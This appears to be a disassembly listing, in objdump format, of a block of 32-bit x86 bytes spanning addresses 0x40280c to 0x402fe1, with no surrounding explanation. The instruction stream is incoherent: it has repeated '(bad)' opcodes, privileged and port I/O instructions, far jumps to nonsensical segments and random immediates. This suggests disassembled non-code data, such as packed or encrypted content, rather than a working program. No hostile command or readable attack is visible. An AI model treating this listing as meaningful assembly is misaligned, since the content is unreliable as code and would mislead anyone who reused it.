  40280c:	and    ebx,0x617d8c93
  402812:	shr    DWORD PTR ds:0xb5a08022,0x4d
  402819:	les    ecx,FWORD PTR [ebx-0x6fa7a0ff]
  40281f:	inc    edx
  402820:	int    0xd
  402822:	out    0x7a,eax
  402824:	jmp    0x909f:0xc9ecfd86
  40282b:	outs   dx,DWORD PTR ds:[esi]
  40282c:	pop    eax
  40282d:	xchg   esi,eax
  40282e:	xchg   ecx,eax
  40282f:	sub    al,0xe4
  402831:	push   ecx
  402832:	clc    
  402833:	mov    ds:0xda5fdd53,eax
  402838:	jp     0x402810
  40283a:	xchg   esp,eax
  40283b:	pop    ebx
  40283c:	dec    eax
  40283d:	dec    esp
  40283e:	inc    edi
  40283f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402840:	sub    eax,0xc56b2be7
  402845:	mov    edx,0xe57ef0d1
  40284a:	rol    BYTE PTR [edi+0xcdcdceb],0x38
  402851:	or     edi,edi
  402853:	mov    dh,0xfb
  402855:	mov    edx,0x52441e42
  40285a:	dec    eax
  40285b:	js     0x40286c
  40285d:	je     0x4027ff
  40285f:	and    al,dh
  402861:	dec    ch
  402863:	push   cs
  402864:	dec    edx
  402865:	jo     0x402896
  402867:	fimul  DWORD PTR [edx-0x56fc9daf]
  40286d:	adc    al,BYTE PTR [eax]
  40286f:	jne    0x4028d4
  402871:	(bad)  [edx+0x47d85721]
  402877:	push   ss
  402878:	mov    esi,0x78ee9c38
  40287d:	repz xor cl,BYTE PTR [esi+ebx*8+0x11]
  402882:	mov    ch,0x9
  402884:	or     al,BYTE PTR [esi-0x61]
  402887:	push   ecx
  402888:	mov    ch,0xd7
  40288a:	mov    edx,0xaeb60c4f
  40288f:	sbb    BYTE PTR [esp+esi*2+0x4e37db8e],dh
  402896:	dec    esp
  402897:	int    0x41
  402899:	ficomp WORD PTR [ecx]
  40289b:	cmp    edx,DWORD PTR [edx-0x6d2cea27]
  4028a1:	popf   
  4028a2:	or     DWORD PTR [eax+eax*2+0x28],esi
  4028a6:	mov    al,0xa5
  4028a8:	ss call ebx
  4028ab:	iret   
  4028ac:	add    al,0x2e
  4028af:	dec    ebp
  4028b0:	jg     0x40287e
  4028b2:	push   eax
  4028b3:	sbb    BYTE PTR [ecx+edi*8-0x42],dh
  4028b7:	jnp    0x402845
  4028b9:	pop    ds
  4028ba:	push   ds
  4028bb:	ret    0x298
  4028be:	push   eax
  4028bf:	and    eax,DWORD PTR ds:0x4a8ab0d
  4028c5:	int3   
  4028c6:	jp     0x402930
  4028c8:	mov    ebp,0x40a2aa54
  4028cd:	xor    bh,ch
  4028cf:	and    DWORD PTR [edi+edx*1],edi
  4028d2:	cmp    cl,BYTE PTR [esi]
  4028d4:	gs pop es
  4028d6:	cmc    
  4028d7:	cld    
  4028d8:	xchg   ecx,eax
  4028d9:	mov    edi,0x6521f4fa
  4028de:	mov    DWORD PTR [esi+0x3d],esp
  4028e1:	sbb    ebx,ebp
  4028e3:	repnz mov ebp,DWORD PTR [edi]
  4028e6:	ret    
  4028e7:	divps  xmm5,XMMWORD PTR [ecx]
  4028ea:	xor    eax,0x62bc9f68
  4028ef:	int3   
  4028f0:	push   ds
  4028f1:	dec    esi
  4028f2:	xlat   BYTE PTR ds:[ebx]
  4028f3:	sbb    eax,0xf4a71392
  4028f8:	xor    BYTE PTR [ebp-0x147118ab],cl
  4028fe:	iret   
  4028ff:	popa   
  402900:	cdq    
  402901:	nop
  402902:	and    eax,0xe53e2409
  402907:	ror    DWORD PTR [ebx+0x67],cl
  40290a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40290b:	outs   dx,BYTE PTR fs:[esi]
  40290d:	popf   
  40290e:	test   BYTE PTR [ebx+0x5e2a427e],dl
  402914:	hlt    
  402915:	dec    ebp
  402916:	pop    DWORD PTR [esi]
  402918:	int3   
  402919:	or     DWORD PTR [eax-0x8],ebp
  40291c:	sbb    BYTE PTR [esi-0x53552652],dh
  402922:	push   es
  402923:	adc    al,0xa0
  402925:	inc    ecx
  402926:	xchg   esp,eax
  402927:	cmp    BYTE PTR [edi+0x72],0xa8
  40292b:	imul   ebp,edx,0x63a2efb3
  402931:	xchg   edi,eax
  402932:	jnp    0x40296e
  402934:	pushf  
  402935:	daa    
  402936:	jmp    0x402955
  402938:	(bad)  
  402939:	cld    
  40293a:	loop   0x4028e3
  40293c:	into   
  40293d:	mov    cl,0x87
  40293f:	aad    0x8e
  402941:	and    al,0x62
  402943:	cmp    ch,BYTE PTR [edi+0x3b]
  402946:	adc    ebx,ecx
  402948:	shl    BYTE PTR [edx-0x38e8d293],0x40
  40294f:	pusha  
  402950:	xor    al,0x6e
  402952:	mov    ds:0x5722b8bf,eax
  402957:	fimul  WORD PTR [edi-0x1a098918]
  40295d:	cwde   
  40295e:	enter  0x4687,0xba
  402962:	pop    edx
  402963:	xor    ebx,DWORD PTR es:[eax+0x2d429a98]
  40296a:	outs   dx,DWORD PTR ds:[esi]
  40296b:	jno    0x402925
  40296d:	xor    eax,0x696dcd0e
  402972:	stc    
  402973:	lods   eax,DWORD PTR ds:[esi]
  402974:	shl    DWORD PTR [esi+0x566f0a00],0xfd
  40297b:	call   0x4c53557c
  402980:	xchg   edi,eax
  402981:	pop    es
  402982:	push   eax
  402983:	push   ecx
  402984:	and    eax,0x5698ba7e
  402989:	aad    0xb8
  40298b:	daa    
  40298c:	loope  0x4029b4
  40298e:	adc    BYTE PTR [ebx-0x4e2ddac4],al
  402994:	popf   
  402995:	add    edi,DWORD PTR [ebx-0x46]
  402998:	dec    edi
  402999:	out    dx,al
  40299a:	enter  0x7398,0xa4
  40299e:	mov    ecx,0x7296f38a
  4029a3:	mov    DWORD PTR [ebp-0x70],0xbbad8ff1
  4029aa:	in     eax,0x54
  4029ac:	pop    edi
  4029ad:	xlat   BYTE PTR ds:[ebx]
  4029ae:	jno    0x40297d
  4029b0:	cmp    ch,BYTE PTR [ecx-0x3e]
  4029b3:	push   esi
  4029b4:	xchg   ecx,eax
  4029b5:	popa   
  4029b6:	inc    eax
  4029b7:	lods   al,BYTE PTR ds:[esi]
  4029b8:	iret   
  4029b9:	bsf    ebp,DWORD PTR [esi+0xdc6b14c]
  4029c0:	dec    edi
  4029c1:	mov    eax,0x6409e521
  4029c6:	lock call 0xfc2e7ca1
  4029cc:	stos   DWORD PTR es:[edi],eax
  4029cd:	mov    al,0xaa
  4029cf:	inc    eax
  4029d0:	mov    ds:0x79978735,eax
  4029d5:	mov    al,0x96
  4029d7:	jle    0x4029a3
  4029d9:	scas   eax,DWORD PTR es:[edi]
  4029da:	add    dl,0x52
  4029dd:	and    DWORD PTR [esi-0x7f287c47],0xffffff97
  4029e4:	and    DWORD PTR [ecx+0x60],0xffffffec
  4029e8:	cs in  eax,dx
  4029ea:	call   0xc4df:0x9677636c
  4029f1:	add    cl,BYTE PTR [ebp-0x41a8fe72]
  4029f7:	dec    ecx
  4029f8:	jecxz  0x402a23
  4029fa:	or     BYTE PTR [ebp-0x76b630c7],ch
  402a00:	or     DWORD PTR [esi+0x13],0xffffff99
  402a04:	mov    DWORD PTR [ebx-0x35],0x2c31748c
  402a0b:	psrad  mm3,QWORD PTR [ebp+edx*4-0x4e]
  402a10:	mov    eax,0xbb7df405
  402a15:	inc    ecx
  402a16:	test   BYTE PTR [ebx+0x72],cl
  402a19:	mov    db0,eax
  402a1c:	sar    dh,cl
  402a1e:	test   DWORD PTR [ebp+edi*1-0x32a7451b],0xd2585871
  402a29:	push   ecx
  402a2a:	jo     0x402a04
  402a2c:	mov    es,WORD PTR [ebx-0x1c90faca]
  402a32:	jns    0x4029ee
  402a34:	stc    
  402a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a36:	jmp    0x402a01
  402a38:	retf   0x2af1
  402a3b:	aas    
  402a3c:	xor    al,0xb
  402a3e:	inc    esi
  402a3f:	test   eax,0xb03e67b3
  402a44:	sub    BYTE PTR [esi],ch
  402a46:	xor    ebx,DWORD PTR [ebx]
  402a48:	jo     0x402ab7
  402a4a:	(bad)  
  402a4b:	aam    0x15
  402a4d:	mov    cl,0xa3
  402a4f:	or     BYTE PTR [edi+eiz*8-0x7d075046],al
  402a56:	push   es
  402a57:	and    al,0x9f
  402a59:	jge    0x402a06
  402a5b:	pop    eax
  402a5c:	mov    eax,ds:0x69418b21
  402a61:	jbe    0x402a6c
  402a63:	out    dx,eax
  402a64:	mov    es,WORD PTR [esi]
  402a66:	imul   edx,DWORD PTR fs:[edx+0x74ba6e40],0x92309721
  402a71:	stos   BYTE PTR es:[edi],al
  402a72:	adc    DWORD PTR [ebp-0x26],ecx
  402a75:	push   edx
  402a76:	js     0x402a01
  402a78:	xor    ah,al
  402a7a:	fcom   DWORD PTR [edx+edx*1-0x3]
  402a7e:	imul   edi,esi,0xffffffa0
  402a81:	ss stc 
  402a83:	pop    edx
  402a84:	adc    eax,DWORD PTR [ecx-0x43f2dc07]
  402a8a:	adc    DWORD PTR [esi+0x9],0xbec51186
  402a91:	mov    ebx,0x60ff01f5
  402a96:	mov    eax,0x4c59ffa
  402a9b:	rcl    DWORD PTR [eax-0x6a],cl
  402a9e:	xor    ebx,DWORD PTR [edx+0x2e4fef6d]
  402aa4:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  402aa6:	inc    ebx
  402aa7:	jmp    0x402a9b
  402aa9:	stc    
  402aaa:	pop    eax
  402aab:	mov    eax,0x365bdfda
  402ab0:	mov    dh,0xa1
  402ab2:	xchg   al,bl
  402ab4:	(bad)  
  402ab5:	xor    eax,0x9b05360e
  402aba:	mov    ebp,esp
  402abc:	fimul  DWORD PTR [eax+ebp*2-0x3e748a3c]
  402ac3:	fcmovnb st,st(0)
  402ac5:	or     DWORD PTR [edi-0x47],ecx
  402ac8:	lds    eax,FWORD PTR [ecx+0x1d]
  402acb:	inc    ecx
  402acc:	jmp    0x9890127
  402ad1:	aaa    
  402ad2:	out    0x39,al
  402ad4:	xor    DWORD PTR [ebx+0x26],edi
  402ad7:	into   
  402ad8:	jmp    0x402a85
  402ada:	mov    DWORD PTR [edx-0x406d1dfe],ecx
  402ae0:	adc    al,0x77
  402ae2:	add    ebp,ebp
  402ae4:	mov    bh,0x3e
  402ae6:	push   edx
  402ae7:	push   edx
  402ae8:	cld    
  402ae9:	mov    eax,ds:0xf11767c5
  402aee:	inc    esp
  402aef:	mov    esp,0xc1dd117
  402af4:	shl    DWORD PTR [eax-0x97e8637],1
  402afa:	aas    
  402afb:	outs   dx,DWORD PTR ds:[esi]
  402afc:	xchg   ecx,eax
  402afd:	mov    al,0xb2
  402aff:	inc    esi
  402b00:	xor    al,0x5a
  402b02:	int3   
  402b03:	daa    
  402b04:	xchg   ecx,eax
  402b05:	mov    esp,0x57a64a0b
  402b0a:	and    BYTE PTR [ebp-0x18a775ca],0x9
  402b11:	hlt    
  402b12:	and    al,bh
  402b14:	lahf   
  402b15:	adc    DWORD PTR [ebp+0x28f20e99],edi
  402b1b:	rol    DWORD PTR [ebx-0x3d4c3064],0x12
  402b22:	pop    ecx
  402b23:	test   BYTE PTR [esp+edi*8-0x80],dh
  402b27:	rol    DWORD PTR [edx+0x1effc021],0x6e
  402b2e:	pusha  
  402b2f:	pop    DWORD PTR [eax+0x4]
  402b32:	pop    esp
  402b33:	lods   al,BYTE PTR ds:[esi]
  402b34:	sub    ebx,DWORD PTR [edx]
  402b36:	ins    DWORD PTR es:[edi],dx
  402b37:	in     eax,0xe7
  402b39:	lea    eax,[edx+0x5e4d1bad]
  402b3f:	mov    eax,0xfa06ecf9
  402b44:	loopne 0x402b84
  402b46:	xlat   BYTE PTR ds:[ebx]
  402b47:	jne    0x402b87
  402b49:	push   es
  402b4a:	cmp    DWORD PTR [ebp+0x5fad9ba3],0x30
  402b51:	jp     0x402b1c
  402b53:	xchg   ebp,eax
  402b54:	cmp    ah,BYTE PTR [esi]
  402b56:	adc    DWORD PTR [ecx],edi
  402b58:	jmp    0x402bbf
  402b5a:	sub    BYTE PTR [ebp-0x64de232c],al
  402b60:	imul   esp,DWORD PTR [ebx-0x6f],0x5da2f939
  402b67:	push   esi
  402b68:	xchg   esp,eax
  402b69:	adc    eax,0x985070e8
  402b6e:	(bad)  
  402b6f:	xchg   edi,eax
  402b70:	adc    DWORD PTR [eax-0x6bb45416],ebp
  402b76:	loopne 0x402b52
  402b78:	and    ebx,esi
  402b7a:	mov    ebp,DWORD PTR [eax+0x1268f03d]
  402b80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b81:	xchg   ecx,eax
  402b82:	jecxz  0x402b7e
  402b84:	xchg   bh,al
  402b86:	mov    ds:0x352939b9,al
  402b8b:	shl    DWORD PTR [edx*4-0x6e3935b0],0xf1
  402b93:	iret   
  402b94:	add    dh,BYTE PTR [eax+0x4d]
  402b97:	mov    DWORD PTR [edi+0x11cadb3d],edx
  402b9d:	ret    0x309
  402ba0:	xchg   DWORD PTR [edx+0x7b],eax
  402ba3:	repnz pop esp
  402ba5:	daa    
  402ba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ba7:	push   es
  402ba8:	icebp  
  402ba9:	sub    al,0x25
  402bab:	and    edx,DWORD PTR [edi]
  402bad:	aas    
  402bae:	aas    
  402baf:	add    al,cl
  402bb1:	and    edi,esp
  402bb3:	test   al,0xf8
  402bb5:	adc    cl,BYTE PTR [edi+ebx*1-0x55]
  402bb9:	hlt    
  402bba:	mov    bl,0xac
  402bbc:	dec    ebp
  402bbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bbe:	push   ebp
  402bbf:	mov    ecx,0x421392fa
  402bc4:	inc    edx
  402bc5:	addr16 (bad) 
  402bc7:	jne    0x402c04
  402bc9:	inc    esi
  402bca:	and    BYTE PTR [ebp-0x50],ch
  402bcd:	sub    dh,BYTE PTR ds:0x3d9cdc4c
  402bd3:	out    0x23,al
  402bd5:	add    eax,0xd372427f
  402bda:	std    
  402bdb:	add    al,0x38
  402bdd:	dec    eax
  402bde:	cmp    DWORD PTR [eax-0x45],0x20539ce8
  402be5:	jmp    0x4a04:0xe3d00798
  402bec:	add    ah,BYTE PTR [ecx]
  402bee:	mov    ds:0x22a8f359,al
  402bf3:	int3   
  402bf4:	adc    DWORD PTR [ebp+0x168785de],eax
  402bfa:	add    edx,eax
  402bfc:	and    ch,BYTE PTR [ecx]
  402bfe:	mov    eax,0xe4b9f93
  402c03:	mov    ds:0x7b900eac,eax
  402c08:	adc    al,0xa9
  402c0a:	or     DWORD PTR [edx+0x7],edx
  402c0d:	sbb    DWORD PTR [edx],ebp
  402c0f:	retf   
  402c10:	cld    
  402c11:	push   edx
  402c12:	cdq    
  402c13:	ins    BYTE PTR es:[edi],dx
  402c14:	iret   
  402c15:	mov    dh,0x94
  402c17:	rol    ecx,1
  402c19:	dec    ebp
  402c1a:	add    edx,ecx
  402c1c:	int3   
  402c1d:	add    eax,DWORD PTR [esi-0x789ae473]
  402c23:	push   0x44183b
  402c28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c29:	dec    edx
  402c2a:	jno    0x402c2a
  402c2c:	or     al,BYTE PTR [edx]
  402c2e:	sub    edx,esi
  402c30:	xor    eax,0xe9153299
  402c35:	xchg   ecx,eax
  402c36:	mov    ch,BYTE PTR [edi]
  402c38:	cmp    ebx,0xe8dccbd3
  402c3e:	je     0x402c47
  402c40:	xchg   esp,eax
  402c41:	out    0x6e,al
  402c43:	ret    0xae89
  402c46:	cmp    ecx,DWORD PTR [ebx+ebp*8-0x15209992]
  402c4d:	mov    ebp,DWORD PTR [ecx+ebp*1]
  402c50:	ret    0xe2cd
  402c53:	push   ecx
  402c54:	js     0x402c3e
  402c56:	in     eax,0xca
  402c58:	push   0x613db6de
  402c5d:	xchg   ebp,eax
  402c5e:	imul   ecx,ecx,0x74
  402c61:	pop    esp
  402c62:	mov    ebp,0x364d5606
  402c67:	sub    BYTE PTR [eax],0x9c
  402c6a:	sahf   
  402c6b:	retf   0xd166
  402c6e:	out    0xea,al
  402c70:	cld    
  402c71:	xlat   BYTE PTR ds:[ebx]
  402c72:	scas   eax,DWORD PTR es:[edi]
  402c73:	push   esi
  402c74:	adc    eax,0xb622e35f
  402c79:	and    BYTE PTR [eax],cl
  402c7b:	pushf  
  402c7c:	je     0x402c5a
  402c7e:	shl    esp,1
  402c80:	and    BYTE PTR [ecx-0x5339b150],ah
  402c86:	retf   0xceff
  402c89:	xchg   edi,eax
  402c8a:	data16 icebp 
  402c8c:	les    ebp,FWORD PTR [ebp+0x56]
  402c8f:	xor    BYTE PTR ss:[edx+0x60],dl
  402c93:	mov    ch,0x60
  402c95:	clc    
  402c96:	aad    0x82
  402c98:	cmp    dh,bl
  402c9a:	dec    ebp
  402c9b:	adc    edi,DWORD PTR [esi]
  402c9d:	inc    esp
  402c9e:	icebp  
  402c9f:	jle    0x402cff
  402ca1:	xchg   ebp,eax
  402ca2:	ss fucomi st,st(4)
  402ca5:	or     al,0xd8
  402ca7:	adc    di,cx
  402caa:	xor    bl,cl
  402cac:	xor    DWORD PTR [edx+0x6e],ebx
  402caf:	add    eax,0x4ced2e4c
  402cb4:	movlps QWORD PTR [ebx],xmm7
  402cb7:	sub    al,0x26
  402cb9:	mov    cl,0x3f
  402cbb:	sbb    DWORD PTR [eax+ecx*4],esp
  402cbe:	push   ss
  402cbf:	sub    BYTE PTR [esi],ah
  402cc1:	shl    DWORD PTR [ebx+0x13a27d3b],0xfa
  402cc8:	cmp    bh,BYTE PTR [eax-0x4359f3d4]
  402cce:	es das 
  402cd0:	out    dx,al
  402cd1:	mov    al,ds:0x235d1945
  402cd6:	gs pop ecx
  402cd8:	out    dx,eax
  402cd9:	push   es
  402cda:	add    bh,BYTE PTR [eax-0x8]
  402cdd:	add    eax,0x69410f32
  402ce2:	js     0x402c7b
  402ce4:	cmp    BYTE PTR [ebx+0x7cf62b6d],al
  402cea:	dec    eax
  402ceb:	stc    
  402cec:	push   ds
  402ced:	fsub   DWORD PTR [ebp-0x36]
  402cf0:	adc    DWORD PTR [ebx-0x1a06711],ecx
  402cf6:	jnp    0x402c9f
  402cf8:	test   eax,0x5bd6027f
  402cfd:	or     eax,0x9d41c84b
  402d02:	fstp   QWORD PTR [eax-0x42b79410]
  402d08:	jae    0x402c9d
  402d0a:	(bad)  
  402d0b:	in     eax,0x5d
  402d0d:	lods   al,BYTE PTR ds:[esi]
  402d0e:	in     eax,0x46
  402d10:	fadd   QWORD PTR [ecx-0x69ef3af6]
  402d16:	shl    edx,cl
  402d18:	ins    DWORD PTR es:[edi],dx
  402d19:	test   eax,0x936b5438
  402d1e:	mov    BYTE PTR ds:0x6d043554,bl
  402d24:	sub    dl,BYTE PTR [edi+eax*2+0xb633b80]
  402d2b:	lods   eax,DWORD PTR ds:[esi]
  402d2c:	xchg   edx,eax
  402d2d:	pop    edx
  402d2e:	lock cmp DWORD PTR [esi+0x21],eax
  402d32:	xchg   edx,eax
  402d33:	xchg   ecx,eax
  402d34:	int3   
  402d35:	into   
  402d36:	mov    ds,ebx
  402d38:	xor    ebx,DWORD PTR [ecx-0x71]
  402d3b:	cmp    al,0x8c
  402d3d:	repz sbb DWORD PTR [eax+0x2dbbe86b],ebp
  402d44:	stc    
  402d45:	sbb    edx,ecx
  402d47:	cwde   
  402d48:	sahf   
  402d49:	stos   DWORD PTR es:[edi],eax
  402d4a:	lods   eax,DWORD PTR ds:[esi]
  402d4b:	xchg   esp,eax
  402d4c:	xchg   DWORD PTR [edi+0x9],edi
  402d4f:	dec    edi
  402d50:	sahf   
  402d51:	dec    esi
  402d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d53:	nop
  402d54:	sub    eax,0x932edfc6
  402d59:	into   
  402d5a:	xchg   edi,eax
  402d5b:	pop    ss
  402d5c:	jb     0x402d9d
  402d5e:	jns    0x402d54
  402d60:	cmp    eax,0xbb800992
  402d65:	clc    
  402d66:	inc    eax
  402d67:	icebp  
  402d68:	shl    BYTE PTR [ebx],0xe2
  402d6b:	cmc    
  402d6c:	sub    esp,DWORD PTR [esi+0x5e565c3b]
  402d72:	mov    edx,0xb0043e5
  402d77:	xor    dh,dh
  402d79:	mov    ds:0x80eb0b18,al
  402d7e:	hlt    
  402d7f:	cmp    esp,DWORD PTR [ebx+0x35]
  402d82:	out    0xa1,eax
  402d84:	hlt    
  402d85:	xchg   ebx,eax
  402d86:	fnstsw WORD PTR [eax+eiz*8-0x556d1f90]
  402d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d8e:	mov    edi,0xae1c688f
  402d93:	jmp    0x93e4:0x91c6
  402d99:	into   
  402d9a:	jmp    FWORD PTR [edi+0x49]
  402d9d:	or     BYTE PTR [ecx-0x2228dc79],ch
  402da3:	dec    edi
  402da4:	cmp    al,0xa9
  402da6:	mov    edi,0xe647496f
  402dab:	shl    BYTE PTR [edx-0x5200bb50],1
  402db1:	jmp    0x402d4b
  402db3:	outs   dx,BYTE PTR ds:[esi]
  402db4:	jns    0x402e0a
  402db6:	push   edx
  402db7:	jp     0x402df7
  402db9:	pop    esi
  402dba:	fidiv  WORD PTR [ebp-0x4]
  402dbd:	jbe    0x402df8
  402dbf:	(bad)  
  402dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dc1:	sub    edi,ebp
  402dc3:	dec    esi
  402dc4:	gs fabs 
  402dc7:	lea    ecx,[edx+0x53]
  402dca:	ss retf 0xa485
  402dce:	aad    0x4b
  402dd0:	popf   
  402dd1:	arpl   WORD PTR [esi],sp
  402dd3:	jnp    0x402e05
  402dd5:	or     ah,cl
  402dd7:	pop    esp
  402dd8:	xor    BYTE PTR [esi-0x3f143551],dl
  402dde:	fidivr WORD PTR [eax]
  402de0:	inc    ebp
  402de1:	and    al,0x57
  402de3:	sbb    ecx,DWORD PTR [ecx+0x1c313614]
  402de9:	imul   ecx,DWORD PTR [eax+0x7],0xc447d570
  402df0:	or     al,0xd0
  402df2:	push   edi
  402df3:	cmc    
  402df4:	adc    eax,0x791e35cc
  402df9:	cld    
  402dfa:	push   ebx
  402dfb:	mov    ebp,0xed3419a3
  402e00:	sub    DWORD PTR [esi-0x1d],esp
  402e03:	arpl   WORD PTR [ebx+eax*1],bx
  402e06:	jo     0x402e4b
  402e08:	std    
  402e09:	pop    edi
  402e0a:	(bad)  
  402e0b:	js     0x402e26
  402e0d:	(bad)  
  402e0e:	mov    dh,0xd8
  402e10:	push   esp
  402e11:	xlat   BYTE PTR ds:[ebx]
  402e12:	in     eax,dx
  402e13:	or     al,0x2e
  402e15:	or     dh,BYTE PTR [esi]
  402e17:	or     DWORD PTR [ecx+eiz*1],esi
  402e1a:	xchg   ecx,eax
  402e1b:	call   0x9a94:0x928102e5
  402e22:	in     al,dx
  402e23:	pop    eax
  402e24:	arpl   WORD PTR [ebx-0x3d8831bc],dx
  402e2a:	int3   
  402e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e2c:	addr16 push ds
  402e2e:	xchg   ebx,eax
  402e2f:	jbe    0x402e5f
  402e31:	cmp    al,0x9d
  402e33:	jg     0x402e8e
  402e35:	pop    ebx
  402e36:	int3   
  402e37:	cld    
  402e38:	add    DWORD PTR [edi+0x214929b8],ebp
  402e3e:	gs shl ecx,0xda
  402e42:	sub    DWORD PTR [edx+0x326554ce],eax
  402e48:	push   0x21e63411
  402e4d:	sbb    BYTE PTR [ebx],al
  402e4f:	(bad)  
  402e50:	mov    ebx,0xe275521d
  402e55:	adc    DWORD PTR [esi+edx*8+0x14e3c2e4],ebx
  402e5c:	fs aad 0x9b
  402e5f:	cmp    al,0xb3
  402e61:	fucompp 
  402e63:	fisubr DWORD PTR [ebx+0xbbba4]
  402e69:	fdivr  QWORD PTR [esi-0x5a]
  402e6c:	mov    WORD PTR [esi+0x530e9819],?
  402e72:	add    cl,dl
  402e74:	daa    
  402e75:	push   es
  402e76:	xchg   ebx,eax
  402e77:	(bad)  
  402e78:	scas   eax,DWORD PTR es:[edi]
  402e79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e7a:	lock jb 0x402e69
  402e7d:	cmp    DWORD PTR [ecx+0x1c],ebp
  402e80:	fdivr  QWORD PTR [ecx]
  402e82:	sbb    esi,edx
  402e84:	adc    DWORD PTR [edi],eax
  402e86:	push   ss
  402e87:	clc    
  402e88:	mov    al,ds:0xe93f301f
  402e8d:	push   esp
  402e8e:	icebp  
  402e8f:	mov    dh,0x5a
  402e91:	inc    DWORD PTR [ebp+0x724276d9]
  402e97:	out    0x6,eax
  402e99:	sbb    ecx,DWORD PTR [ecx]
  402e9b:	mov    DWORD PTR [ebx+eax*8],0xefc3596
  402ea2:	mov    eax,0xa0a5f065
  402ea7:	and    DWORD PTR [esp+edi*2],eax
  402eaa:	mov    ebp,0x2988fc9f
  402eaf:	jae    0x402f28
  402eb1:	push   eax
  402eb2:	fs inc edi
  402eb4:	(bad)  
  402eb5:	sub    esp,DWORD PTR [ebx+ebx*8]
  402eb8:	xchg   ecx,eax
  402eb9:	fsub   DWORD PTR [edx+0x3cde316c]
  402ebf:	sar    DWORD PTR [ecx],cl
  402ec1:	(bad)  
  402ec2:	lods   al,BYTE PTR ds:[esi]
  402ec3:	mov    eax,ds:0xa4aa0d60
  402ec8:	sbb    al,0x13
  402eca:	fwait
  402ecb:	int3   
  402ecc:	outs   dx,DWORD PTR ds:[esi]
  402ecd:	sbb    ah,BYTE PTR [esi+edx*1+0x25e4e507]
  402ed4:	sub    al,0x1
  402ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ed7:	jne    0x402e97
  402ed9:	ins    DWORD PTR es:[edi],dx
  402eda:	imul   bl
  402edc:	lahf   
  402edd:	enter  0xe941,0x60
  402ee1:	popa   
  402ee2:	ins    DWORD PTR es:[edi],dx
  402ee3:	sbb    esp,eax
  402ee5:	inc    esp
  402ee6:	sbb    BYTE PTR [ebp-0x3970a31a],cl
  402eec:	xor    ebp,0x4b06e229
  402ef2:	popf   
  402ef3:	ret    0x225
  402ef6:	cld    
  402ef7:	enter  0xd484,0xd7
  402efb:	mov    ds:0xa30ade1f,al
  402f00:	fnstenv [ebp-0x4d02ac5b]
  402f06:	cs or  al,0x24
  402f09:	jl     0x402ee8
  402f0b:	ins    DWORD PTR es:[edi],dx
  402f0c:	in     al,dx
  402f0d:	push   ds
  402f0e:	test   eax,0x62de24a1
  402f13:	inc    ebp
  402f14:	push   es
  402f15:	out    dx,al
  402f16:	(bad)  
  402f17:	push   ebp
  402f18:	scas   eax,DWORD PTR es:[edi]
  402f19:	outs   dx,BYTE PTR ds:[esi]
  402f1a:	pop    ebp
  402f1b:	push   ss
  402f1c:	pop    es
  402f1d:	(bad)  
  402f1f:	jae    0x402f47
  402f21:	inc    edi
  402f22:	mov    eax,DWORD PTR [edx]
  402f24:	stos   DWORD PTR es:[edi],eax
  402f25:	add    al,0x94
  402f27:	test   eax,0x8da7837d
  402f2c:	imul   ebp,DWORD PTR [ecx+0x77],0x68f95cd
  402f33:	pop    edx
  402f34:	mov    cl,cl
  402f36:	daa    
  402f37:	iret   
  402f38:	xchg   ebp,eax
  402f39:	sti    
  402f3a:	sub    DWORD PTR [edi-0x73abd8c7],edi
  402f40:	and    BYTE PTR [esi+0x6cea9a88],cl
  402f46:	jge    0x402f14
  402f48:	(bad)  
  402f4b:	rcl    DWORD PTR [ebp+0x5ce386cf],cl
  402f51:	xchg   dl,bh
  402f53:	out    0xa2,eax
  402f55:	pop    ds
  402f56:	into   
  402f57:	call   FWORD PTR [ebx+ecx*8+0x5dbb48c7]
  402f5e:	stos   DWORD PTR es:[edi],eax
  402f5f:	cwde   
  402f60:	addr16 xchg ebx,edi
  402f63:	repz mov dh,0xbf
  402f66:	pop    ebp
  402f67:	jnp    0x402ef2
  402f69:	xor    ah,ah
  402f6b:	outs   dx,BYTE PTR ds:[esi]
  402f6c:	and    BYTE PTR [esi+edx*4],dh
  402f6f:	xlat   BYTE PTR ds:[ebx]
  402f70:	das    
  402f71:	sbb    al,0x69
  402f73:	cmp    ebp,edi
  402f75:	cmp    cl,BYTE PTR [ebp+0x242be817]
  402f7b:	aam    0x81
  402f7d:	js     0x402f44
  402f7f:	(bad)  
  402f82:	sub    al,0x56
  402f84:	(bad)  
  402f86:	mov    BYTE PTR [edx],bh
  402f88:	fidivr WORD PTR [esi+0x2c]
  402f8b:	lods   al,BYTE PTR ds:[esi]
  402f8c:	cmp    DWORD PTR [esi],ebp
  402f8e:	(bad)  
  402f8f:	sub    cl,cl
  402f91:	inc    ebp
  402f92:	jne    0x402fe8
  402f94:	jne    0x402f54
  402f96:	mov    cl,0xde
  402f98:	cmc    
  402f99:	aam    0x71
  402f9b:	and    dh,BYTE PTR [edx+0x4f]
  402f9e:	add    ch,BYTE PTR [ebp+0x216da51]
  402fa4:	sub    ebx,eax
  402fa6:	ds cli 
  402fa8:	sub    al,0x1
  402faa:	mov    ah,0xa2
  402fac:	mov    edi,0x9d400917
  402fb1:	call   0xd0acd997
  402fb6:	dec    ecx
  402fb7:	adc    eax,0x4563b11f
  402fbc:	xor    cl,cl
  402fbe:	push   es
  402fbf:	sub    eax,0x2974869f
  402fc4:	push   cs
  402fc5:	ror    BYTE PTR [ebx+0x6a97710],0xf4
  402fcc:	jnp    0x402f9e
  402fce:	push   0xab7d18d1
  402fd3:	outs   dx,DWORD PTR ds:[esi]
  402fd4:	test   DWORD PTR [eax-0x6c],ecx
  402fd7:	inc    ebp
  402fd8:	xchg   esp,ebx
  402fda:	lds    edi,FWORD PTR [edi+0x559adfc4]
  402fe0:	pop    es
  402fe1:	pop    ebp
